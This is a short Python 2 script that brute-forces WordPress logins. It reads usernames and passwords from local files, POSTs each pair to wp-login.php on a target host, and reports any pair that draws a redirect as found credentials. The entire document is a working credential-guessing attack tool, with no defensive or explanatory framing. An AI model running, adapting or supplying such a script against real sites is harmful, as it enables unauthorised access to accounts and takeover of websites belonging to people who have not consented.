#!/usr/bin/python

import sys
import httplib, urllib
url="/wp-login.php"
host=""

header={'Cookie':'wordpress_test_cookie=WP+Cookie+check','Referer': 'http://'+host+'/wp-login.php','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140924 Firefox/24.0 Iceweasel/24.8.1','Content-Type': 'application/x-www-form-urlencoded'}
users=[]
source = open("user","r")
for line in source.readlines():
    users.append(line.rstrip())   

source = open("passworda", "r")

i=0
for line in source.readlines():
    conn = httplib.HTTPConnection(host)
    password=line.rstrip()
    for user in users:
        if ((i%20)==0):
            print "%s / %s" %(user,password)
            sys.stdout.flush()
        i+=1   
        params = urllib.urlencode({'log':user,'pwd': password, 'wp-submit':'Connexion','redirect_to':'http://'+host+'/wp-admin','testcookie':1})
        conn.request("POST","%s"%(url),params,header)
        response = conn.getresponse()
        data=response.read()

        if response.status==302:
            print "!!!!!!!! Found Login / Pwd : %s / %s" %(user,password)
            sys.stdout.flush()
